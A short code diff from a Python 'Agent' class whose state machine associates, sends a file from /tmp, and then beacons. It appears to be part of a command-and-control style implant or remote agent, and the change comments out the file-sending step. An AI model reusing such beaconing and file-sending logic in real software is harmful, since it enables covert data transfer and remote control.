@@ -283,7 +283,7 @@ class Agent:
                 if _AGENT_STATE_ENUM == 1:
                     if self.associate():
                         _AGENT_STATE_ENUM = 2
-                        self.send_file("/tmp/in")
+                        # self.send_file("/tmp/in")
                 if _AGENT_STATE_ENUM == 2:
                     beacon_response = self.beacon()
                     if beacon_response is False:
